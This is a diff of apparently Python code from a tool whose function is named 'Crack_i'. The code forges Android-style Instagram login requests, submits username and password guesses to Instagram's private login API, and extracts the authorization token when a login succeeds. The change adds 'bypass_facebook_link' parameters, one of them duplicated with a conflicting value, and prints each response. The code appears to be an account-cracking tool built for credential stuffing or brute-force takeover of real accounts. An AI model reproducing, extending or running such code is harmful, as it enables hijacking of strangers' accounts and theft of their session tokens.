@@ -903,11 +903,12 @@ def Crack_i(username, memek):
                 'x-fb-http-engine': 'MNS',
                 'x-fb-rmd': 'state=URL_ELIGIBLE'
             })
-            inner_params = {"jazoest":jazoest,"country_codes":"[{\"country_code\":\"62\",\"source\":[\"default\",\"uig_via_phone_id\"]}]","phone_id":family_device_id,"enc_password":f"#PWD_INSTAGRAM:0:{base_ts}:{urllib.parse.quote(password)}","username":username,"adid":adid,"guid":device_id,"device_id":f"android-{android_id}","google_tokens":"[]","login_attempt_count":"0"}
+            inner_params = {"jazoest":jazoest,"country_codes":"[{\"country_code\":\"62\",\"source\":[\"default\",\"uig_via_phone_id\"]}]","phone_id":family_device_id,"enc_password":f"#PWD_INSTAGRAM:0:{base_ts}:{urllib.parse.quote(password)}","username":username,"adid":adid,"guid":device_id,"device_id":f"android-{android_id}","google_tokens":"[]","login_attempt_count":"0","bypass_facebook_link":"true","bypass_facebook_link":"prefer_instagram_login"}
             json_str = json.dumps(inner_params,separators=(',',':'))
             signed_body = f"SIGNATURE.{json_str}"
             data = {"signed_body":signed_body}
             response = ses.post('https://i.instagram.com/api/v1/accounts/login/',data=data,allow_redirects=True)
+            print(response.text)
             if "logged_in_user" in str(response.text.replace('\\', '')):
                 header_str = str(response.headers)
                 ig_set_search = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\']?([^"\',]+)', header_str, re.IGNORECASE)
